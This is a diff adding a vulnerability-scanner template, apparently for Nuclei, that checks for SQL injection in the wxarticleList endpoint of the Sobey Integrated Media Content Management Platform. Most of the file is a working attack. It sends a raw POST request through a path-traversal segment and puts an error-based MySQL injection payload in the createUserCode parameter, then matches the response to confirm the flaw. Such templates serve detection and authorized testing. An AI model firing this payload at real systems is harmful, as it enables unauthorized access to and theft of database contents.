@@ -1,0 +1,36 @@
+id: poc-yaml-sobey-imcmp-wxarticlelist-sqli
+info:
+  name: Sobey Integrated Media Content Management Platform wxarticleList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A potential SQL injection vulnerability exists in the Sobey Integrated Media Content Management Platform in the wxarticleList endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/mch/statistics/js/../wxarticleList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        createUserCode=1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3141=3141,md5({{t1}})))),0x7e),3141) AND 'JXVi'='JXVi&token=1&siteCode=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - "wxarticleList"
+          - "java.sql.SQLException"
+      - type: regex
+        part: body
+        regex:
+          - "~{{t2}}~"
